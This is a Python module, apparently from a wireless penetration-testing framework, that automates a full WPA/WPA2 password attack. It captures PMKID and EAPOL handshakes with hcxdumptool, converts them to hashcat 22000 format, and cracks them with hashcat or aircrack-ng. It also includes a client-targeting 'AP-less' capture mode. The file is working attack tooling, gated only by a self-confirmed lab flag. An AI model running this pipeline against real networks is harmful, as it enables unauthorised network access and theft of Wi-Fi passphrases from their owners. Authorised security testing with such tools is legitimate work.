#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""PMKID AutoPwn - automated PMKID capture and offline cracking pipeline.

Full pipeline: hcxdumptool (PMKID+EAPOL capture) -> hcxpcapngtool (convert to
hashcat 22000 format) -> hashcat -m 22000 (GPU-accelerated crack).

Supports targeted single-AP and broadcast capture modes. AP-less client attack
variant also available via hcxdumptool.

Requires: hcxdumptool, hcxpcapngtool (hcxtools), hashcat (optional: aircrack-ng).

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
from wirelessxpl.core.os_guard import OSRequirement, requires_os

logger = logging.getLogger(__name__)


def _which(binary: str) -> Optional[str]:
    return shutil.which(binary)


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """PMKID/EAPOL capture -> hashcat 22000 auto-crack pipeline."""

    __info__ = {
        "name": "PMKID AutoPwn Pipeline",
        "description": (
            "Automated WPA/WPA2 PMKID and EAPOL handshake capture via hcxdumptool, "
            "conversion to hashcat 22000 format via hcxpcapngtool, and GPU-accelerated "
            "offline crack via hashcat. Supports single-target (filterlist) and broadcast "
            "modes. The PMKID attack is client-less: no deauth or client needed."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "ZerBea/hcxdumptool (MIT), hashcat team (MIT), invoked as subprocess",
        ),
        "references": (
            "https://hashcat.net/forum/thread-7717.html",
            "https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2",
            "https://github.com/ZerBea/hcxdumptool",
            "https://github.com/ZerBea/hcxtools",
        ),
        "devices": ("wifi", "802.11 WPA/WPA2"),
    }

    mode = OptString(
        "full",
        "Pipeline mode: full (capture+convert+crack), capture, convert, crack, apless",
    )
    interface = OptString("", "Wi-Fi interface (hcxdumptool manages monitor mode)")
    target_bssid = OptString("", "Target AP BSSID (empty = capture all nearby)")
    channel_list = OptString("", "Channels to scan (comma-separated, e.g., 1,6,11); empty = all")

    # File paths
    pcapng_file = OptString("", "Captured pcapng file path (for convert/crack modes)")
    hash_file = OptString("", "Hashcat 22000 hash file (for crack mode)")
    output_dir = OptString(".tmp", "Output directory for captures and hashes")

    # Capture options
    capture_time_s = OptInteger(120, "Capture duration in seconds")
    enable_status = OptInteger(2, "hcxdumptool status interval (0 = off)")
    rca_scan = OptBool(False, "Enable RCASCAN (passive, no TX)")

    # Crack options
    wordlist = OptString("", "Wordlist path for hashcat dict attack")
    hashcat_mode = OptInteger(22000, "Hashcat mode (22000=PMKID+EAPOL, 16800=PMKID-only)")
    hashcat_extra_args = OptString("", "Extra hashcat arguments (e.g., -r rules/best64.rule)")
    use_aircrack = OptBool(False, "Use aircrack-ng instead of hashcat for cracking")

    dry_run = OptBool(False, "Print commands without executing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _require(self, name: str) -> Optional[str]:
        path = _which(name)
        if not path:
            print_error(f"{name} not found in PATH.")
        return path

    def _outdir(self) -> str:
        d = str(self.output_dir).strip() or ".tmp"
        os.makedirs(d, exist_ok=True)
        return d

    def _run_cmd(self, cmd: List[str], *, timeout: int = 0,
                 label: str = "") -> Optional[str]:
        cmd_str = " ".join(cmd)
        if bool(self.dry_run):
            print_info(f"[dry-run] {label}: {cmd_str}")
            return None

        print_status(f"{label}: {cmd_str}")
        try:
            kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.STDOUT}
            if timeout > 0:
                kwargs["timeout"] = timeout
            result = subprocess.run(cmd, **kwargs)
            output = result.stdout.decode("utf-8", errors="replace")
            for line in output.strip().splitlines():
                print_info(line)
            return output
        except subprocess.TimeoutExpired:
            print_status(f"{label} completed (timeout={timeout}s)")
            return ""
        except FileNotFoundError:
            print_error(f"Binary not found: {cmd[0]}")
            return None

    def _step_capture(self) -> Optional[str]:
        """Run hcxdumptool to capture PMKID/EAPOL frames."""
        hcx = self._require("hcxdumptool")
        if not hcx:
            return None

        iface = str(self.interface).strip()
        if not iface:
            print_error("Set interface.")
            return None

        outdir = self._outdir()
        ts = int(time.time())
        pcapng = os.path.join(outdir, f"pmkid_capture_{ts}.pcapng")

        cmd = [hcx, "-i", iface, "-o", pcapng]

        bssid = str(self.target_bssid).strip()
        if bssid:
            filterfile = os.path.join(outdir, f"filter_{ts}.txt")
            with open(filterfile, "w") as f:
                f.write(bssid.replace(":", "").lower() + "\n")
            cmd.extend(["--filterlist_ap", filterfile, "--filtermode=2"])
            print_info(f"Target BSSID filter: {bssid}")

        channels = str(self.channel_list).strip()
        if channels:
            cmd.extend([f"--channel={channels}"])

        if bool(self.rca_scan):
            cmd.append("--active_beacon")

        capture_time = int(self.capture_time_s)
        if capture_time <= 0:
            capture_time = 120

        if bool(self.dry_run):
            print_info(f"[dry-run] Would run for {capture_time}s: {' '.join(cmd)}")
            return pcapng

        print_status(f"Capturing for {capture_time}s...")
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid if os.name != "nt" else None,
            )
            time.sleep(capture_time)
            if os.name != "nt":
                os.killpg(os.getpgid(proc.pid), 2)
            else:
                proc.terminate()
            proc.wait(timeout=10)

            output = proc.stdout.read().decode("utf-8", errors="replace")
            for line in output.strip().splitlines()[-20:]:
                print_info(line)
        except Exception as exc:
            print_error(f"Capture error: {exc}")
            return None

        if os.path.isfile(pcapng) and os.path.getsize(pcapng) > 0:
            print_success(f"Capture saved: {pcapng}")
            return pcapng
        else:
            print_error("No capture file produced. Check interface/permissions.")
            return None

    def _step_convert(self, pcapng: str) -> Optional[str]:
        """Convert pcapng to hashcat 22000 format."""
        tool = self._require("hcxpcapngtool")
        if not tool:
            return None

        if not pcapng or not os.path.isfile(pcapng):
            print_error(f"pcapng file not found: {pcapng}")
            return None

        outdir = self._outdir()
        hash_out = os.path.join(
            outdir,
            os.path.basename(pcapng).replace(".pcapng", ".hc22000"),
        )
        wordlist_out = os.path.join(outdir, "extracted_essids.txt")

        cmd = [tool, "-o", hash_out, "-E", wordlist_out, pcapng]

        output = self._run_cmd(cmd, label="hcxpcapngtool")
        if output is None:
            return None

        if os.path.isfile(hash_out) and os.path.getsize(hash_out) > 0:
            line_count = 0
            with open(hash_out, "r") as f:
                line_count = sum(1 for _ in f)
            print_success(f"Hash file: {hash_out} ({line_count} hashes)")
            return hash_out
        else:
            print_error("No hashes extracted. PMKID/EAPOL may not have been captured.")
            return None

    def _step_crack(self, hash_file: str) -> None:
        """Crack hashes using hashcat or aircrack-ng."""
        if not hash_file or not os.path.isfile(hash_file):
            print_error(f"Hash file not found: {hash_file}")
            return

        wl = str(self.wordlist).strip()
        if not wl:
            print_error("Set wordlist for cracking.")
            return

        if bool(self.use_aircrack):
            ac = self._require("aircrack-ng")
            if not ac:
                return
            cmd = [ac, "-w", wl]
            bssid = str(self.target_bssid).strip()
            if bssid:
                cmd.extend(["-b", bssid])
            cmd.append(hash_file)
            self._run_cmd(cmd, label="aircrack-ng crack")
            return

        hc = self._require("hashcat")
        if not hc:
            return

        hmode = int(self.hashcat_mode)
        cmd = [hc, "-m", str(hmode), hash_file, wl, "--status", "--status-timer=30"]
        extra = str(self.hashcat_extra_args).strip()
        if extra:
            cmd.extend(extra.split())

        self._run_cmd(cmd, label=f"hashcat -m {hmode}")

    def _step_apless(self) -> None:
        """AP-less client attack via hcxdumptool (attacks clients without AP)."""
        hcx = self._require("hcxdumptool")
        if not hcx:
            return

        iface = str(self.interface).strip()
        if not iface:
            print_error("Set interface.")
            return

        outdir = self._outdir()
        ts = int(time.time())
        pcapng = os.path.join(outdir, f"apless_capture_{ts}.pcapng")

        cmd = [hcx, "-i", iface, "-w", pcapng, "--active_beacon"]

        channels = str(self.channel_list).strip()
        if channels:
            cmd.append(f"--channel={channels}")

        capture_time = int(self.capture_time_s)
        print_info(
            "AP-less mode: attacking clients directly (PMKID/EAPOL without AP). "
            "Clients probing for known networks will be served association frames."
        )

        if bool(self.dry_run):
            print_info(f"[dry-run] Would run for {capture_time}s: {' '.join(cmd)}")
            return

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid if os.name != "nt" else None,
            )
            time.sleep(capture_time)
            if os.name != "nt":
                os.killpg(os.getpgid(proc.pid), 2)
            else:
                proc.terminate()
            proc.wait(timeout=10)
            output = proc.stdout.read().decode("utf-8", errors="replace")
            for line in output.strip().splitlines()[-15:]:
                print_info(line)
        except Exception as exc:
            print_error(f"AP-less capture error: {exc}")
            return

        if os.path.isfile(pcapng) and os.path.getsize(pcapng) > 0:
            print_success(f"AP-less capture saved: {pcapng}")
            hash_file = self._step_convert(pcapng)
            if hash_file:
                print_info(f"Convert + crack with: set mode crack; set hash_file {hash_file}")
        else:
            print_error("No capture produced.")


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        if not shutil.which("hcxdumptool"):
            raise RuntimeError(
                "hcxdumptool nao encontrado. Instale com: sudo apt install hcxdumptool\n"
                "Alternativa: use o modo capture='scapy' para captura nativa sem hcxdumptool."
            )
        if not shutil.which("hcxpcapngtool"):
            raise RuntimeError(
                "hcxpcapngtool nao encontrado. Instale com: sudo apt install hcxtools"
            )

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        op = str(self.mode).strip().lower()

        if op == "full":
            pcapng = self._step_capture()
            if not pcapng:
                return
            hash_file = self._step_convert(pcapng)
            if not hash_file:
                return
            if str(self.wordlist).strip():
                self._step_crack(hash_file)
            else:
                print_info(
                    f"Hashes ready at {hash_file}. "
                    "Set wordlist and run mode=crack to start cracking."
                )

        elif op == "capture":
            pcapng = self._step_capture()
            if pcapng:
                print_info(f"Next: set pcapng_file {pcapng}; set mode convert")

        elif op == "convert":
            pcapng = str(self.pcapng_file).strip()
            if not pcapng:
                print_error("Set pcapng_file for conversion.")
                return
            hash_file = self._step_convert(pcapng)
            if hash_file:
                print_info(f"Next: set hash_file {hash_file}; set mode crack")

        elif op == "crack":
            hf = str(self.hash_file).strip()
            if not hf:
                print_error("Set hash_file (.hc22000) for cracking.")
                return
            self._step_crack(hf)

        elif op == "apless":
            self._step_apless()

        else:
            print_error(
                f"Unknown mode: {op}. Valid: full, capture, convert, crack, apless"
            )
